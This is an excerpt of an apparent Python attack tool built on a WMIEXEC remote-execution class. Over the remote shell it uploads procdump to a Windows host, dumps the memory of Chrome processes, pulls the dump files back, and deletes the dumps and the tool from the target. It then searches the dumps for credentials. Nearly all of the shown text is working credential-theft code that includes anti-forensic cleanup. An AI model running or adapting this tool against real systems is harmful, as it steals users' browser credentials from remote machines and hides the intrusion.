...
### update this with location of procdump

PROC_PATH = "/root/Documents/Tools/Procdump/procdump64.exe"
...
class WMIEXEC:
    ...
    def run(self, addr):
        ...
        try:
            ...
            ### This is ugly and super hacky but it works (maybe)###
            
            chromepid = []
            self.shell.onecmd('tasklist /FI "IMAGENAME eq chrome.exe"')
            pid = input("Enter the PID for all items to dump, comma seperated:\n")
            chromepid = pid.replace(' ','').split(",")
            self.shell.do_put(PROC_PATH)
            for p in chromepid:
                self.shell.onecmd("procdump64.exe -ma -accepteula "+p+" chrome-"+p+".dmp")
                self.shell.do_get("chrome-"+p+".dmp")
                self.shell.onecmd("del chrome-"+p+".dmp")
            print("[*] Cleaning Up!")
            self.shell.onecmd("del procdump64.exe")
            os.system('strings chrome-* > dump.txt')

            ### No apologies for what is about to pass as regex ###
            ...
            # Say something
            print("Searching the dumps for credentials. This may take a while.....\n")
            ...
            print("Search complete...making the results a bit more presentable\
                    (maybe - there are bound to be some false positives) \n")
